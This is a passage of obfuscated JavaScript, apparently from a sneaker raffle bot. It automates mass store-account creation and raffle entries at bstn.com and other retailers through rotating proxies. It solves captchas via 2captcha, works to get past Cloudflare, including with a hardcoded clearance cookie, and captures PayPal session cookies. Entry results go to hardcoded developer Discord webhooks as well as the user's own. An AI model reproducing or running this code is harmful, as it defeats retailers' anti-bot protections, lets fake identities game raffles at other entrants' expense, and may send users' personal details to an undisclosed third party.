        _0x2768f8(_0x597b81['name'] + '\x20Task\x20' + (_0x4b4489 + 0x1) + '\x20/\x20' + _0x49d8fd['length'] + '\x20||\x20File:\x20' + _0x2de798 + '\x20Proxies:\x20' + _0x327247), await _0x3cdb09(_0x49d8fd, _0x4b4489), _0x532009 = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x57b088
                },
                {
                    'name': 'Size',
                    'value': '' + _0x49d8fd[_0x4b4489]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xc43b8d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x44c289
                }
            ]
        }], _0x7742e = { 'embeds': _0x532009 }, _0x1d1db9 = _0x597b81['data'];
        _0x4b1938 == 'exp' ? _0x1d1db9['data']['attributes']['email'] = '' + _0x49d8fd[_0x4b4489]['FirstName'] + _0x49d8fd[_0x4b4489]['LastName'] + _0xc43b8d['catchall'] : _0x1d1db9['data']['attributes']['email'] = '' + _0x49d8fd[_0x4b4489]['Email'];
        if (_0x49d8fd[_0x4b4489]['Size'] == 'RANDOM') {
        }
        _0x1d1db9['data']['attributes']['properties']['$first_name'] = '' + _0x49d8fd[_0x4b4489]['FirstName'], _0x1d1db9['data']['attributes']['properties']['$last_name'] = '' + _0x49d8fd[_0x4b4489]['LastName'], _0x1d1db9['data']['attributes']['properties']['$address1'] = _0x49d8fd[_0x4b4489]['Address1'] + '\x20' + _0x49d8fd[_0x4b4489]['Address2'] + '\x20' + _0x49d8fd[_0x4b4489]['HouseNumber'], _0x1d1db9['data']['attributes']['properties']['$zip'] = '' + _0x49d8fd[_0x4b4489]['Zip'], _0x1d1db9['data']['attributes']['properties']['$city'] = '' + _0x49d8fd[_0x4b4489]['City'], _0x1d1db9['data']['attributes']['properties']['$country'] = '' + _0x49d8fd[_0x4b4489]['Country'], _0x1d1db9['data']['attributes']['properties']['Size'] = '' + _0x49d8fd[_0x4b4489]['Size'], _0x1d1db9['data']['attributes']['properties']['$phone_number'] = '' + _0x49d8fd[_0x4b4489]['Phone'], _0x1d1db9['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x49d8fd[_0x4b4489]['Follower'];
    }
    if (_0xc43b8d['useRandomProxy'] = ![])
        var _0x15110c = _0x4caeb4[_0x4b4489]['split'](':');
    else
        var _0x20dd33 = Math['round'](Math['random']() * (_0x4caeb4['length'] - 0x1)), _0x15110c = _0x4caeb4[_0x20dd33]['split'](':');
    var _0x4303a0 = {
        'jar': _0x225238,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x597b81['url'],
        'headers': _0x597b81['headers'],
        'body': JSON['stringify'](_0x1d1db9),
        'proxy': 'http://' + _0x15110c[0x2] + ':' + _0x15110c[0x3] + '@' + _0x15110c[0x0] + ':' + _0x15110c[0x1]
    };
    return _0x4b1938 != 'ver' && (_0x4303a0['url'] = _0x597b81['url'], _0x4303a0['headers'] = _0x597b81['headers']), _0x4b1938 == 'ver' && (_0x4303a0['method'] = 'GET'), new Promise(function (_0x577142, _0x231efa) {
        callback = async (_0x48d532, _0x47ca20, _0x500a13) => {
            if (!_0x48d532 && _0x47ca20['statusCode'] == 0xca || !_0x48d532 && _0x47ca20['statusCode'] == 0xc8) {
                if (_0x4b1938 != 'ver') {
                    var _0x582524 = await _0x555e75(_0x49d8fd[_0x4b4489], _0x597b81, 'dev', ![]), _0x48bd88 = await _0x555e75(_0x49d8fd[_0x4b4489], _0x597b81, 'pub', ![]);
                    const _0x36c7ba = {
                        'succesDEVMSG': { 'embeds': [_0x582524] },
                        'succesPUBMSG': { 'embeds': [_0x48bd88] }
                    };
                    if (_0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '')
                        try {
                            await _0x57e113(_0xc43b8d['webhook'], _0x36c7ba['succesDEVMSG']);
                        } catch {
                        }
                    await _0x1b3ea1(0xc8), await _0x57e113(_0x344e4d, _0x36c7ba['succesDEVMSG']), await _0x1b3ea1(0xc8);
                    try {
                        await _0x57e113(_0x45d3b5, _0x36c7ba['succesPUBMSG']);
                    } catch {
                    }
                }
                _0x1dc885(_0x49d8fd[_0x4b4489], _0x597b81), _0x577142(console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x597b81['name'] + ']\x20Task\x20' + (_0x4b4489 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x4b1938 != 'ver') {
                    var _0x62844b = '' + _0x48d532, _0x2b17dd = await _0x555e75(_0x49d8fd[_0x4b4489], _0x597b81, 'dev', !![], _0x62844b), _0x4f92f3 = {};
                    _0x4f92f3['errorDEV'] = { 'embeds': [_0x2b17dd] }, _0x254c07(_0x49d8fd[_0x4b4489], _0x597b81), _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x4f92f3['errorDEV']), await _0x57e113(_0x570583, _0x4f92f3['errorDEV']);
                }
                _0x231efa(console['log'](_0x561248() + '\x20[' + _0x597b81['name'] + ']\x20Task\x20' + (_0x4b4489 + 0x1) + ':\x20' + _0x48d532));
            }
        };
        try {
            _0x4b1938 != 'ver' && console['log'](_0x561248() + '\x20[' + _0x597b81['name'] + ']\x20Task\x20' + (_0x4b4489 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1d1db9['data']['attributes']['email']), _0x511317(_0x4303a0, callback);
        } catch (_0x22effa) {
            console['log'](_0x561248() + '\x20Task\x20' + (_0x4b4489 + 0x1) + ':\x20' + _0x22effa);
        }
    });
}
;
async function _0x4db678(_0x4b399e, _0x286d5d, _0x320aa1) {
    var _0x4228e8;
    _0x2768f8('' + _0x286d5d);
    var _0x429231 = _0x320aa1[0x0]['split'](':');
    const _0x14dc90 = await _0x114f6['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x429231[0x0] + ':' + _0x429231[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x561248() + '\x20[' + _0x286d5d + ']\x20Getting\x20Session');
        const _0xcf172c = JSON['parse'](_0x16016b['readFileSync']('sessions/log.json')), _0x5713b8 = await _0x14dc90['newPage']();
        await _0x5713b8['authenticate']({
            'username': '' + _0x429231[0x2],
            'password': '' + _0x429231[0x3]
        }), await _0x5713b8['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x5713b8, await _0x5713b8['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x561248() + '\x20[' + _0x286d5d + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x5713b8['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x561248() + '\x20[' + _0x286d5d + ']\x20Successfully\x20logged\x20in'), await _0x1b3ea1(0x2710), _0x4228e8 = await _0x5713b8['cookies'](), _0x16016b['writeFileSync']('sessions/log.json', '' + JSON['stringify'](_0x4228e8));
        } catch (_0x1157aa) {
            throw new Error('Login\x20session\x20expired\x20' + _0x1157aa);
        }
        for (var _0x1ed124 = 0x0; _0x1ed124 < _0x4b399e['length']; _0x1ed124++) {
            console['log'](_0x561248() + '\x20[' + _0x286d5d + ']\x20Task\x20' + (_0x1ed124 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x2768f8(_0x286d5d + '\x20Task\x20' + (_0x1ed124 + 0x1) + '\x20/\x20' + _0x4b399e['length']);
            const _0x5e7735 = await _0x14dc90['newPage']();
            await _0x5e7735['goto']('' + _0x4b399e[_0x1ed124], { 'waitUntil': 'networkidle2' }), await _0x1b3ea1(0xbb8);
            try {
                const _0x1dda77 = await _0x5e7735['$']('#challenge-heading');
                _0x1dda77 && (console['log'](_0x561248() + '\x20[' + _0x286d5d + ']\x20Task\x20' + (_0x1ed124 + 0x1) + '\x20:\x20' + _0x3e492c['yellow']('2FA\x20Required')), await _0x5e7735['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x1b3ea1(0x61a8), await _0x5e7735['waitForSelector']('#payment-submit-btn'), await _0x5e7735['$eval']('#payment-submit-btn', _0x41422e => _0x41422e['click']()), await _0x5e7735['click']('#payment-submit-btn');
                try {
                    await _0x5e7735['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x1b3ea1(0x5dc), console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x286d5d + ']\x20Task\x20' + (_0x1ed124 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x28735d) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x28735d['message']);
                } finally {
                    await _0x5e7735['close'](), await _0x1b3ea1(0x4650);
                }
            } catch (_0x4f629c) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x286d5d + ']\x20Task\x20' + (_0x1ed124 + 0x1) + '\x20:\x20' + _0x4f629c));
            }
        }
    } catch (_0x33224b) {
        console['log'](_0x3e492c['red']('' + _0x33224b));
    } finally {
        await _0x14dc90['close']();
    }
}
async function _0x4bfd99(_0x5a872b, _0x17ba36, _0x4c9fcc) {
    _0x114f6['use'](_0x51de99()), _0x114f6['use'](_0x3b1867({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xc43b8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x412497 = 0x0; _0x412497 < _0x5a872b['length']; _0x412497++) {
        if (_0x4b219b != 'yes')
            var _0x4b219b = '', _0x2b0ebb = 0x0;
        var _0x4e95d3;
        await _0x3cdb09(_0x5a872b, _0x412497), _0x2768f8(_0x4c9fcc['name'] + '\x20Task\x20' + (_0x412497 + 0x1) + '\x20/\x20' + _0x5a872b['length'] + '\x20||\x20File:\x20' + _0x2de798 + '\x20Proxies:\x20' + _0x327247);
        var _0x5da48e = await _0x555e75(_0x5a872b[_0x412497], _0x4c9fcc, 'acc', ![]);
        const _0x162716 = { 'succesDEVMSG': { 'embeds': [_0x5da48e] } }, _0x40d30d = 'https://www.bstn.com/eu_en/customer/account/';
        var _0x33e8d4 = Math['round'](Math['random']() * (_0x17ba36['length'] - 0x1)), _0x4c81c0 = _0x17ba36[_0x33e8d4]['split'](':');
        const _0x2afaa4 = await _0x114f6['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4c81c0[0x0] + ':' + _0x4c81c0[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--force-device-scale-factor=0.3'
            ]
        });
        try {
            const _0x1a2eb3 = await _0x2afaa4['newPage']();
            await _0x1a2eb3['authenticate']({
                'username': '' + _0x4c81c0[0x2],
                'password': '' + _0x4c81c0[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0x4c9fcc['name'] + ']\x20Task\x20' + (_0x412497 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1a2eb3['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1a2eb3['setRequestInterception'](!![]), _0x1a2eb3['on']('request', _0x44b7c5 => {
                _0x44b7c5['resourceType']() === 'image' ? _0x44b7c5['abort']() : _0x44b7c5['continue']();
            }), await _0x1a2eb3['goto']('' + _0x40d30d), await _0x1a2eb3['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x1a2eb3['click']('button[class=\x22cf2Lf6\x22]'), await _0x1a2eb3['waitForSelector']('a.action.create.primary.social-login'), console['log'](_0x561248() + '\x20[' + _0x4c9fcc['name'] + ']\x20Task\x20' + (_0x412497 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x1b3ea1(0x7d0), await _0x1a2eb3['click']('a.action.create.primary.social-login'), await _0x1b3ea1(0x7d0), await _0x1a2eb3['click']('button.button.dashboard-actions-toolbar__item'), console['log'](_0x561248() + '\x20[' + _0x4c9fcc['name'] + ']\x20Task\x20' + (_0x412497 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x1b3ea1(0x190), await _0x1a2eb3['type']('#firstname', _0x5a872b[_0x412497]['FirstName'], { 'delay': 0xf0 }), await _0x1b3ea1(0x190), await _0x1a2eb3['type']('#lastname', _0x5a872b[_0x412497]['LastName'], { 'delay': 0xe6 }), await _0x1b3ea1(0x190), await _0x1a2eb3['type']('#bss_email_address', _0x5a872b[_0x412497]['Email'], { 'delay': 0x122 }), await _0x1b3ea1(0x190), await _0x1a2eb3['type']('#password', _0x5a872b[_0x412497]['Password'], { 'delay': 0x1e0 }), console['log'](_0x561248() + '\x20[' + _0x4c9fcc['name'] + ']\x20Task\x20' + (_0x412497 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x1b3ea1(0x2bc), await _0x1a2eb3['click']('#bt-social-create'), await _0x1a2eb3['click']('#bt-social-create'), await _0x1b3ea1(0x1388);
            const _0x3b8033 = await _0x1a2eb3['$']('#bss_email_address-error');
            if (_0x3b8033)
                throw new Error('Invalid\x20Email');
            const _0x357131 = await _0x1a2eb3['$']('#password-error');
            if (_0x357131)
                throw new Error('Invalid\x20Password');
            await _0x1a2eb3['waitForSelector']('div.mesg-success'), _0x4b219b = 'no', console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x4c9fcc['name'] + ']\x20Task\x20' + (_0x412497 + 0x1) + '\x20:\x20Account\x20' + _0x5a872b[_0x412497]['Email'] + '\x20Generated')), _0x16016b['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x5a872b[_0x412497]['Email'] + ',' + _0x5a872b[_0x412497]['Password']);
            try {
                _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x162716['succesDEVMSG']);
            } catch {
            }
            await _0x57e113(_0x4f5698, _0x162716['succesDEVMSG']), console['log'](_0x3e492c['yellow'](_0x561248() + '\x20[' + _0x4c9fcc['name'] + ']\x20Task\x20' + (_0x412497 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20verify'));
        } catch (_0x178804) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x4c9fcc['name'] + ']\x20Task\x20' + (_0x412497 + 0x1) + '\x20:\x20' + _0x178804)), _0x4e95d3 = '' + _0x178804;
            var _0x2a327a = await _0x555e75(_0x5a872b[_0x412497], _0x4c9fcc, 'acc', !![], _0x4e95d3);
            _0x162716['errorDEV'] = { 'embeds': [_0x2a327a] }, _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x162716['errorDEV']), await _0x57e113(_0x570583, _0x162716['errorDEV']);
        } finally {
            _0x2afaa4['close']();
            if (_0x4b219b == 'yes' && _0x2b0ebb != 0x5) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x4c9fcc['name'] + ']\x20Task\x20' + (_0x412497 + 0x1) + '\x20:\x20Retrying')), _0x412497 = _0x412497 - 0x1, _0x2b0ebb = _0x2b0ebb + 0x1;
                continue;
            }
            _0x4b219b == 'yes' && _0x2b0ebb >= 0x5 && (_0x254c07(_0x5a872b[_0x412497], _0x4c9fcc), _0x4b219b = 'no', _0x2b0ebb = 0x0), console['log'](_0x561248() + '\x20[' + _0x4c9fcc['name'] + ']\x20Waiting\x20for\x20' + _0xc43b8d['delay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['delay']);
        }
    }
}
async function _0x230c03(_0x4d0e3e, _0x391667, _0x6ec39d) {
    _0x114f6['use'](_0x51de99());
    for (var _0x4fdbaf = 0x0; _0x4fdbaf < _0x4d0e3e['length']; _0x4fdbaf++) {
        if (_0xd887b3 != 'yes')
            var _0xd887b3 = '', _0x42cb1f = 0x0;
        var _0xc0d174 = Math['round'](Math['random']() * (_0x391667['length'] - 0x1)), _0x5b74ea = _0x391667[_0xc0d174]['split'](':');
        const _0x27bad6 = await _0x114f6['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x5b74ea[0x0] + ':' + _0x5b74ea[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x19bfa0 = await _0x27bad6['newPage']();
            await _0x19bfa0['authenticate']({
                'username': '' + _0x5b74ea[0x2],
                'password': '' + _0x5b74ea[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0x6ec39d['name'] + ']\x20Task\x20' + (_0x4fdbaf + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x19bfa0['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x19bfa0['setRequestInterception'](!![]), _0x19bfa0['on']('request', _0x357fec => {
                _0x357fec['resourceType']() === 'image' || _0x357fec['resourceType']() === 'font' || _0x357fec['resourceType']() === 'media' ? _0x357fec['abort']() : _0x357fec['continue']();
            }), console['log'](_0x561248() + '\x20[' + _0x6ec39d['name'] + ']\x20Task\x20' + (_0x4fdbaf + 0x1) + '\x20:\x20Getting\x20Session'), await _0x19bfa0['goto'](_0x4d0e3e[_0x4fdbaf]), console['log'](_0x561248() + '\x20[' + _0x6ec39d['name'] + ']\x20Task\x20' + (_0x4fdbaf + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x19bfa0['waitForTimeout'](0xbb8);
            try {
                await _0x19bfa0['waitForSelector']('.dashboard-main_title'), _0xd887b3 = 'no', console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x6ec39d['name'] + ']\x20Task\x20' + (_0x4fdbaf + 0x1) + '\x20:\x20Verification\x20Successful'));
                var _0x315248 = await _0x555e75(null, _0x6ec39d, 'ver', ![]);
                const _0x3f2e98 = { 'succesDEVMSG': { 'embeds': [_0x315248] } };
                await _0x57e113(_0x4cf4a8, _0x3f2e98['succesDEVMSG']);
            } catch (_0x12f011) {
                throw new Error(_0x12f011);
            }
        } catch (_0x5d4afe) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x6ec39d['name'] + ']\x20Task\x20' + (_0x4fdbaf + 0x1) + '\x20:\x20' + _0x5d4afe));
            var _0x3ac9aa = _0x5d4afe, _0x551dbe = await _0x555e75(null, _0x6ec39d, 'ver', !![], _0x3ac9aa);
            const _0x55168e = { 'errorDEVMSG': { 'embeds': [_0x551dbe] } };
            _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x55168e['errorDEVMSG']), await _0x57e113(_0x570583, _0x55168e['errorDEVMSG']), _0xd887b3 = 'yes';
        } finally {
            _0x27bad6['close']();
            if (_0xd887b3 == 'yes' && _0x42cb1f != 0x5) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x6ec39d['name'] + ']\x20Task\x20' + (_0x4fdbaf + 0x1) + '\x20:\x20Retrying')), _0x4fdbaf = _0x4fdbaf - 0x1, _0x42cb1f = _0x42cb1f + 0x1;
                continue;
            }
            _0xd887b3 == 'yes' && _0x42cb1f >= 0x5 && (_0x254c07(bstn[_0x4fdbaf], _0x6ec39d), _0xd887b3 = 'no', _0x42cb1f = 0x0), console['log'](_0x561248() + '\x20[' + _0x6ec39d['name'] + ']\x20Waiting\x20for\x20' + _0xc43b8d['delay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['delay']);
        }
    }
}
async function _0x1b89d9(_0x1a36c1, _0x2a8162, _0x3a9092) {
    _0x114f6['use'](_0x51de99()), _0x114f6['use'](_0x3b1867({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xc43b8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x86a2e4 = 0x0; _0x86a2e4 < _0x1a36c1['length']; _0x86a2e4++) {
        var _0x2aae9e;
        await _0x3cdb09(_0x1a36c1, _0x86a2e4);
        if (_0x426b97 != 'yes')
            var _0x426b97 = '', _0x2f9208 = 0x0;
        _0x2768f8(_0x3a9092['name'] + '\x20Task\x20' + (_0x86a2e4 + 0x1) + '\x20/\x20' + _0x1a36c1['length'] + '\x20||\x20File:\x20' + _0x2de798 + '\x20Proxies:\x20' + _0x327247);
        var _0x2f616f = Math['round'](Math['random']() * (_0x2a8162['length'] - 0x1)), _0x301847 = _0x2a8162[_0x2f616f]['split'](':'), _0x268f21;
        try {
            _0x268f21 = await _0x114f6['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x301847[0x0] + ':' + _0x301847[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x268f21 = await _0x114f6['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x301847[0x0] + ':' + _0x301847[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x31f27c = await _0x268f21['newPage'](), _0x1047dd = await _0x31f27c['target']()['createCDPSession'](), { windowId: _0x2631e8 } = await _0x1047dd['send']('Browser.getWindowForTarget');
            await _0x31f27c['setViewport']({
                'width': 0x501,
                'height': 0x2d0
            });
            var _0x5f1d46 = [{
                'name': 'cf_clearance',
                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                'domain': '.bstn.com',
                'path': '/',
                'expires': 1707818183.331533,
                'httpOnly': !![],
                'secure': !![]
            }];
            await _0x31f27c['authenticate']({
                'username': '' + _0x301847[0x2],
                'password': '' + _0x301847[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0x3a9092['name'] + ']\x20Task\x20' + (_0x86a2e4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x31f27c['goto']('' + _0x1a36c1[_0x86a2e4]['Url']), console['log'](_0x561248() + '\x20[' + _0x3a9092['name'] + ']\x20Task\x20' + (_0x86a2e4 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x31f27c['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x1047dd['send']('Browser.setWindowBounds', {
                'windowId': _0x2631e8,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x1b3ea1(0x1388), await _0x31f27c['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x31f27c['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1b3ea1(0x1f4), console['log'](_0x561248() + '\x20[' + _0x3a9092['name'] + ']\x20Task\x20' + (_0x86a2e4 + 0x1) + '\x20:\x20Logging\x20in'), await _0x31f27c['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x398ceb => _0x398ceb['click']()), await _0x31f27c['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x31f27c['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1b3ea1(0x7d0), await _0x31f27c['waitForSelector']('#email-login'), await _0x31f27c['type']('#email-login', '' + _0x1a36c1[_0x86a2e4]['Email']), await _0x1b3ea1(0x1f4), await _0x31f27c['waitForSelector']('#password'), await _0x31f27c['type']('#password', '' + _0x1a36c1[_0x86a2e4]['Password']), await _0x1b3ea1(0x1f4);
            try {
                await _0x31f27c['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x5b6965 => _0x5b6965['click']()), await _0x31f27c['click']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]');
            } catch {
            }
            try {
                await _0x31f27c['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
            } catch (_0xa0f2ed) {
            }
            await _0x1b3ea1(0x3e8);
            const _0x2865a4 = await _0x31f27c['$']('.enteredDraw_container__2KmQ_');
            if (_0x2865a4)
                throw new Error('Duplicate\x20Entry');
            console['log'](_0x561248() + '\x20[' + _0x3a9092['name'] + ']\x20Task\x20' + (_0x86a2e4 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x1a36c1[_0x86a2e4]['Size']);
            if (_0x1a36c1[_0x86a2e4]['Size'] != 'RANDOM') {
                var _0x4c38b6 = _0x1a36c1[_0x86a2e4]['Size']['replace']('.', ',');
                const _0x19aeb1 = await _0x31f27c['$x']('//div[contains(text(),\x20' + _0x4c38b6 + ')]');
                await _0x19aeb1[0x0]['click']();
            } else {
                const _0x453139 = await _0x31f27c['$$']('div.swatchTile_tile__IRH9Q');
                var _0x54852d = Math['round'](Math['random']() * (_0x453139['length'] - 0x1));
                await _0x453139[_0x54852d]['click']();
            }
            await _0x1b3ea1(0x1f4);
            const _0x445682 = await _0x31f27c['$']('.addressList_addressItem__LE2PB');
            if (_0x445682) {
            } else
                console['log'](_0x561248() + '\x20[' + _0x3a9092['name'] + ']\x20Task\x20' + (_0x86a2e4 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x31f27c['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x1b3ea1(0x5dc), await _0x31f27c['waitForSelector']('#firstname'), await _0x31f27c['type']('#firstname', '' + _0x1a36c1[_0x86a2e4]['FirstName']), await _0x1b3ea1(0x1f4), await _0x31f27c['waitForSelector']('#firstname'), await _0x31f27c['type']('#lastname', '' + _0x1a36c1[_0x86a2e4]['LastName']), await _0x1b3ea1(0x1f4), await _0x31f27c['waitForSelector']('#firstname'), await _0x31f27c['type']('#street', '' + _0x1a36c1[_0x86a2e4]['Address1']), await _0x1b3ea1(0x1f4), await _0x31f27c['waitForSelector']('#firstname'), await _0x31f27c['type']('#houseNumber', _0x1a36c1[_0x86a2e4]['HouseNumber'] + '\x20' + _0x1a36c1[_0x86a2e4]['Address2']), await _0x1b3ea1(0x1f4), await _0x31f27c['waitForSelector']('#firstname'), await _0x31f27c['select']('#country_code', '' + _0x1a36c1[_0x86a2e4]['Country']), await _0x1b3ea1(0x1f4), await _0x31f27c['type']('#postcode', '' + _0x1a36c1[_0x86a2e4]['Zip']), await _0x1b3ea1(0x1f4), await _0x31f27c['type']('#city', '' + _0x1a36c1[_0x86a2e4]['City']), await _0x1b3ea1(0x1f4), await _0x31f27c['type']('#telephone', '' + _0x1a36c1[_0x86a2e4]['Phone']), await _0x1b3ea1(0x1f4), await _0x31f27c['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
            await _0x1b3ea1(0x9c4);
            try {
                await _0x31f27c['type']('#instagram_name', '' + _0x1a36c1[_0x86a2e4]['Follower']), await _0x31f27c['click']('.note_groupBtn__WLDwH\x20>\x20button');
            } catch {
            }
            console['log'](_0x561248() + '\x20[' + _0x3a9092['name'] + ']\x20Task\x20' + (_0x86a2e4 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1b3ea1(0x5dc);
            try {
                await _0x31f27c['click']('.checkBox_boxHolder__wLGVe');
            } catch {
            }
            await _0x1b3ea1(0x5dc), await _0x31f27c['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0xb32e71 => _0xb32e71['click']()), await _0x1b3ea1(0x1388);
            try {
                await _0x31f27c['waitForSelector']('.success_msg__2HjJY');
            } catch {
                await _0x31f27c['reload']({ 'waitUntil': 'networkidle2' });
                if (_0x1a36c1[_0x86a2e4]['Size'] != 'RANDOM') {
                    var _0x4c38b6 = _0x1a36c1[_0x86a2e4]['Size']['replace']('.', ',');
                    const _0x38ee37 = await _0x31f27c['$x']('//div[contains(text(),\x20' + _0x4c38b6 + ')]');
                    await _0x38ee37[0x0]['click']();
                } else {
                    const _0x259401 = await _0x31f27c['$$']('div.swatchTile_tile__IRH9Q');
                    var _0x54852d = Math['round'](Math['random']() * (_0x259401['length'] - 0x1));
                    await _0x259401[_0x54852d]['click']();
                }
                await _0x1b3ea1(0x5dc);
                try {
                    await _0x31f27c['hover']('#instagram_name'), await _0x31f27c['type']('#instagram_name', '' + _0x1a36c1[_0x86a2e4]['Follower']), await _0x31f27c['click']('.note_groupBtn__WLDwH\x20>\x20button');
                } catch {
                }
                console['log'](_0x561248() + '\x20[' + _0x3a9092['name'] + ']\x20Task\x20' + (_0x86a2e4 + 0x1) + '\x20:\x20Retrying'), await _0x31f27c['hover']('.checkBox_boxHolder__wLGVe'), await _0x1b3ea1(0x5dc), await _0x31f27c['click']('.checkBox_boxHolder__wLGVe'), await _0x1b3ea1(0x157c), await _0x31f27c['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x3d37f7 => _0x3d37f7['click']()), await _0x1b3ea1(0x1388), await _0x31f27c['waitForSelector']('.success_msg__2HjJY');
            }
            _0x426b97 = 'no', _0x1dc885(_0x1a36c1[_0x86a2e4], _0x3a9092), console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x3a9092['name'] + ']\x20Task\x20' + (_0x86a2e4 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            var _0x278f96 = await _0x555e75(_0x1a36c1[_0x86a2e4], _0x3a9092, 'dev', ![]), _0x3343ff = await _0x555e75(_0x1a36c1[_0x86a2e4], _0x3a9092, 'pub', ![]);
